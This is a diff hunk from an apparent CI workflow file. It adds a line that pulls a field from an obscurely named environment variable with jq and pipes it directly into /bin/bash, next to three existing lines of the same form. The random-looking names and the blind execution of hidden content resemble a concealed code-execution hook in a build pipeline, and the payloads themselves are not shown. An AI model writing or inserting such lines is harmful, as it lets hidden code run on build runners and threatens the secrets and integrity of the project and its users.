@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$xnwva97509" | jq -r .jtrep09420 | /bin/bash
           echo $puw43 | jq -r .bpuk7529 | /bin/bash
           echo $oc79 | jq -r .jou5 | /bin/bash
+          echo $isr4 | jq -r .u28567 | /bin/bash
 
       - name: Persist output
         if: always()
